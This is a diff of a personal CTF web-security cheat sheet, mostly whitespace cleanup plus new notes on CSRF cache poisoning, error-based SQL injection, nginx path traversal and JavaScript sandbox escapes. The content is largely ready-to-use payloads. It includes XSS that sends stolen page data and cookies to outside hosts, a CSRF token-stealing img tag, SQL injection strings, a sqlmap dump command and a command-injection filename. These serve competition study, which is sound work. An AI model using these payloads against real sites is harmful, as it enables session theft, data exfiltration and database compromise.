@@ -29,7 +29,7 @@ if _name__ == "__main__":
 ```
 
 - robots.txt
-- client headers 
+- client headers
     - https://securityheaders.com/
     - e.g. `user-agent curl/7.19.3` => vulnerable version
         - https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/let_mee_see.txt
@@ -56,7 +56,7 @@ if _name__ == "__main__":
     OPTIONS / HTTP/1.0
     PROPFIND / HTTP/1.0
     ```
-- response status codes 
+- response status codes
     - e.g. 403 for registered users and 404 for invalid users
 - parameter pollution
     1. search?q=foo
@@ -125,10 +125,23 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
 # cross-site request forgery (CSRF)
 
 - Server validates that form request was sent with same CSRF token in user session
-    - Extracting token: hardcoded in input / included by js 
+    - Extracting token: hardcoded in input / included by js
     ```html
     <img src="http://generateerror.com/does-not-exist.jpg" onerror="javascript:var all_inputs = document.getElementsByTagName('input'); var token = '';for(var i = 0; i < all_inputs.length; i++){if (all_inputs[i].name == 'csrftoken'){token = all_inputs[i].value;}}var iframe = document.createElement('iframe');iframe.src = 'http://ctf.nullcon.net/challenges/web/web4/set_admin.php?user=pepe&csrftoken=' + token + '&Set=Set';document.body.appendChild(iframe);"/>
     ```
+    - cache poisoning - avoid revoking CSRF token by triggering errors in script tag sourcing JSONP payload
+        ```
+        # CORS violation (unmatched domain name, forcing apply to script tag)
+        https://milk.chal.seccon.jp./note.php?_=aaaaaaaaaaaa%20crossorigin%3Duse-credentials
+        # || misrecognize charset, causing syntax error
+        ?_=aaaaaaaaaaaa%20charset%3Dunicodefffe
+        # || misinterpret `defer` attribute as value of `aaaa` attribute, causing token callback to not be defined
+        ?_=aaaaaaaaaaaa%20aaaa%3D
+        # || mismatch in URI check logic to bypass added CSP header
+        https://milk.chal.seccon.jp/note.php/.php
+        ```
+        - [CTFtime\.org / SECCON 2020 Online CTF / Milk / Writeup](https://ctftime.org/writeup/24126)
+        - ~/share/ctf/seccon2020/milk-solver.js
 - [Multiple vulnerabilities that can result in RCE · Issue \#1122 · Codiad/Codiad · GitHub](https://github.com/Codiad/Codiad/issues/1122)
 
 # server-side template injection (SSTI)
@@ -311,7 +324,7 @@ xmlhttp.send();
 <script>
 fetch('http://localhost:5000/notes?name=Angela%20Turner').then(response => response.text()).then(
 data => fetch("http://demo.itmo.xyz", {
-    method: "POST", 
+    method: "POST",
     headers: {
         'Content-Type': 'application/json'
     },"body": JSON.stringify(data)})).then(response => document.write(response));
@@ -347,6 +360,7 @@ Mitigations:
             ```
             ~/code/guides/ctf/WebBook/HTTP/XSS学习.md
 - [Content Security Policy \(CSP\) \- HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+    - https://csp-evaluator.withgoogle.com
     - bypass: using valid elements/attributes
         - `default-src 'self'; script-src 'self' foo.bar.com 'unsafe-inline';` => `<link rel=prefetch href=//bar.com`
         - `<script>//# sourceMappingURL=https://request/?${escape(document.cookie)}</script>`
@@ -362,7 +376,7 @@ Polyglots:
 <script>alert(1)</script>
 </svg>
 
-<?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve"> 
+<?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve">
   ...
   <g>
     <polygon fill="#00B0D9" points="41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 "></polygon>
@@ -374,7 +388,7 @@ Polyglots:
           xhr2.open("POST", "http://XXXX.burpcollaborator.net/");
           xhr2.send(xhr.responseText);
         }
-      }   
+      }
       xhr.open("GET", "http://web50.zajebistyc.tf/profile/admin");
       xhr.withCredentials = true;
       xhr.send();
@@ -394,18 +408,35 @@ exiftool -make "<script>document.location='http://burpcollaboratoridoryourserver
 
 # SQL Injection (SQLI)
 
-```sql
--- ' or 1=1 UNION SELECT database(),1 #
--- ' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = '' #
-
--- User-Agent: ' or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(1) #
--- User-Agent: ' or 1 group by concat_ws(0x3a,(select group_concat(table_name separator ',') from information_schema.tables where table_schema=database()),floor(rand(0)*2)) having min(1) #
-
--- %" UNION SELECT "one", "two"; --%";
--- %" AND username in (SELECT username FROM sqlite_master where username like "%") --
--- Given 3 columns in table:
--- telnet'	oorr	1=0	UNION	SELECT	*	FROM	(SELECT	1)	AS	a	JOIN	(SELECT	*	from	flag)	AS	b	JOIN	(SELECT	1)	AS	c;#
 ```
+' or 1=1 UNION SELECT database(),1 #
+' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = '' #
+
+User-Agent: ' or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(1) #
+User-Agent: ' or 1 group by concat_ws(0x3a,(select group_concat(table_name separator ',') from information_schema.tables where table_schema=database()),floor(rand(0)*2)) having min(1) #
+
+%" UNION SELECT "one", "two"; --%";
+%" AND username in (SELECT username FROM sqlite_master where username like "%") --
+
+-- Given 3 columns in table:
+telnet'	oorr	1=0	UNION	SELECT	*	FROM	(SELECT	1)	AS	a	JOIN	(SELECT	*	from	flag)	AS	b	JOIN	(SELECT	1)	AS	c;#
+
+-- Error-based query: Output contains string "n1ctf"
+-- WAF: preg_match("/get_lock|sleep|benchmark|count|when|case|rlike|count/i",$info)
+-- ExtractValue(xml_frag, xpath_expr)
+-- UpdateXML(xml_target, xpath_expr, new_xml)
+'&&(select extractvalue(rand(),concat(0x3a,((select "n1ctf" from n1ip where 1=1 limit 1)))))&&'
+-- ||
+'&&(select extractvalue(rand(),0x3a6e31637466))&&'
+-- ERROR 1105 (HY000): XPATH syntax error: ':n1ctf'
+-- ||
+'||(select ip from n1ip where updatexml(1,concat('~',(select if(ascii(substring((select database()),1,1))=100,'n1ctf','r3kapig')),'~'),3))||'
+-- ERROR 1105 (HY000): XPATH syntax error: '~n1ctf~'
+```
+- ~/share/ctf/n1ctf2020/web-signin/
+    - https://www.gem-love.com/ctf/2657.html#websignin
+    - https://eine.tistory.com/entry/n1ctf-2020-web-signIn-write-up
+    - https://github.com/Super-Guesser/ctf/tree/master/N1CTF%202020/web/signin
 
 ```bash
 sqlmap -u "http://joking.bitsctf.bits-quark.org/index.php" --data="id=1&submit1=submit" -D hack -T Joker -C Flag --dump
@@ -467,7 +498,7 @@ j:[{"id":1,"body":["foo'"]}]
 - https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html
 - https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
 
-# command injection 
+# command injection
 
 ```
 filename="'$(sleep 5)'a.gif"
@@ -477,11 +508,24 @@ filename="'$(sleep 5)'a.gif"
 - [#863956 \[extra-asciinema\] Command Injection via insecure command formatting](https://hackerone.com/reports/863956)
     - [Avoid\-Command\-Injection\-Node\.md · GitHub](https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b)
 
-# side channels
+# Path Traversal / Local File Inclusion (LFI)
+
+- ~/code/guides/ctf/Web-CTF-Cheatsheet/README.md#LFI
+
+nginx:
+
+- /etc/nginx/sites-enabled/default
+    ```
+    location ^~ /static => /static../foo
+    ```
+    - https://github.com/Toboxos/ctf-writeups/blob/main/HackTheVote2020/Dotlocker1.md
+    - https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/
+
+# Side Channels
 
 - https://snyk.io/blog/node-js-timing-attack-ccc-ctf/
 
-# jail, filter bypass, waf
+# jail, sandbox, waf, filter bypass
 
 - detection, testing
     - https://regex101.com/
@@ -510,6 +554,24 @@ filename="'$(sleep 5)'a.gif"
         o.constructor.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101))())(Math+1)
     ```
     - https://www.sigflag.at/blog/2020/writeup-angstromctf2020-caasio/
+    ```
+    > y
+    'constructor'
+    > y[y]
+    [Function: String]
+    > y[y][y]
+    [Function: Function]
+    > z
+    'return e=>console.log(e)'
+    > y[y][y](z)
+    [Function: anonymous]
+    > y[y][y](z)()
+    [Function]
+    > y[y][y](z)()('foo')
+    foo
+    undefined
+    ```
+    - [CTFtime\.org / Hack\.lu CTF 2020 / BabyJS](https://ctftime.org/task/13520)
 - Object.freeze() is shallow
     ```javascript
     Object.freeze(Math);
@@ -550,10 +612,14 @@ filename="'$(sleep 5)'a.gif"
         - https://samcurry.net/abusing-http-path-normalization-and-cache-poisoning-to-steal-rocket-league-accounts/
 - DNS tunnel
     - https://github.com/iagox86/dnscat2
+- cache poisoning
+    - https://owasp.org/www-community/attacks/Cache_Poisoning
+- https://haboob.sa/ctf/nullcon-2019/babyJs.html
+    - [Breakout in v3\.6\.9 · Issue \#186 · patriksimek/vm2 · GitHub](https://github.com/patriksimek/vm2/issues/186)
 
 ```javascript
 // == "Hello World!"
-/Hello W/.source+/ordl!/.source 
+/Hello W/.source+/ordl!/.source
 ```
 
 ```
